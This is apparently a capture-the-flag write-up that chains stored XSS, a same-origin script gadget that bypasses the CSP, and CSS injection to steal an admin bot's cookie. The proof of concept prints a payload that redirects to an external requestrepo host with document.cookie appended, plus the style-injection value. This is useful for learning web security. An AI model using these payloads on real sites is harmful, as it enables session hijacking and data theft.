the vibes gives that it's an xss challenge , 
lets start by finding a sink for xss where a controlled input is rendred without being escaped
we find this at profile.html :
{{ bio | safe }}
that means the bio field is rendred without any escaping for html special chars ( </>)
thats a good step but looking to the csp header , there is no way to execute js from inline script or data , its restricted to self , so we start searching for a gadget that is controlled and can return javascript , we find that 
/note/<int:note_id>/stats returns as response the tiltle of a note and its visit count directly , with the absence of X-Content-Type-Options: nosniff wich prevent the browser from guessing the content type , we have a controlled gadget that can triggers xss , we just need to put or js code in a note title then in the xss sink we need to call the script like this <script src="/note/{{id}}/stats"></script>
now we have to think how to exfiltrate that cookie , turning back to the csp header we find that connect-src directive is set to self , so we cant fetch an external origin , but this wont stop us , we can notice there is an important directive missing which is navigate-to , that controll the window location , so directly we think in a payload that set the window location to our controlled server ( u can use webhook or requestrepo )
here u will think that u solved the chall , but there is a last part , when u trigger the bot u find out that the bot is not visiting ur profile but it's visiting ur notes page , clicking on the view random note button , but you can notice also that in case of an error was catched and if it was instance of timeoutError the bot will visit ur profile , so how to trigger that type of error , we go back to see the codes of the notes pages and the routes , /user/<int:user_id>/preferences/button-color this seems to be an interesting endpoint , it takes the color and stores it , so wheenver u change a color it s persisted , lets take a look how that handled on the client side , boom we find it , each time an inline styling is used to :
style="background-color: red"
so we can directly think of confusing the bot when clicking that button by setting it to display:none
passing a color like red;display:none will result in a style like this style="background-color: red;display:none" and will make the button not visible , this will trigger a timeoutError when the bot try to click on that button and then will visit the vulnerable page which is the profile page

the proof of concept (PoC) :

1/ making the button not visible:
lets start by setting the button color to red;display:none

2/ create a note with a title contéining the payload 
;window.location='http://jbeju9p3.requestrepo.com?cookie='+document.cookie;// 

3/ update ur bio with this script tag :
<script src="/note/1/stats"></script>

then 2s and u recieve a request on ur webhook containing the flag

hope you find this helpful
